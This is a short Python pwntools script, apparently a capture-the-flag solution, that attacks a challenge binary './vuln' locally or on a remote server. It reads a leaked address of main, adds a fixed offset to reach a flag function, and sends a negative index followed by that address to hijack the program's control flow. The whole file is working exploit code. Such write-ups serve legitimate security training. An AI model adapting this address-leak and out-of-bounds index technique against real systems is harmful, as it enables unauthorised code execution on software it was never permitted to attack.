from pwn import *
from struct import pack
local = False
elf = ELF('./vuln')

if local:
    p = elf.process()
else:
    host = 'spclr.ch'
    port = 1240
    p = remote(host, port)

print(p.recvuntil(b'am: '))
leaked_main = int(p.recvline()[:-1], 16)
print('leaked main as: ', leaked_main)
offset = 0x144
flag_address = leaked_main + offset
print('flag address: ', hex(flag_address)) 

print(p.recvuntil(b'> '))
p.sendline(b'-2')
print(p.recvuntil(b'number: '))
p.sendline(str(flag_address).encode())
print(p.recvline())
